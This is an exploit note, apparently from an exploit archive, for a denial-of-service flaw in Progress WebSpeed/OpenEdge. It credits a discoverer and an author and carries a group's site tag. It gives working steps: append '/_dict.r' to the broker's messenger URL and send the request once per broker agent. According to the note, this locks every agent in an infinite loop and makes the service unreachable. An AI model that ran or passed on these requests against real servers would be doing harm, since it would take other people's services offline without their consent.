#Webspeed OpenEdge Dos exploit 
#Bug Discovered By :Eelko Neven 
#Exploit Coded By spyMASter 
#&#350;eklimizide koyal&#305;m : ) www.ulpow.net The Eliminators of the Web 
#First you have to find the messenger execution url. For example:
http://target/scripts/cgiip.exe/WService=wsbroker1
http://target/scripts/wsisa.dll/WService=wsbroker1

just add the following to the url:
/_dict.r

your url will look like this:
http://target/scripts/cgiip.exe/WService=wsbroker1/_dict.r

When you run the above url you put the agent into an infinite loop (Do While).
If for instance your server runs 5 Broker Agents you just have to run above url
5 times and then all agents will be put in busy mode. From that moment on it's
not possible to access that broker anymore. 

Tested with Progress 10b in production mode.
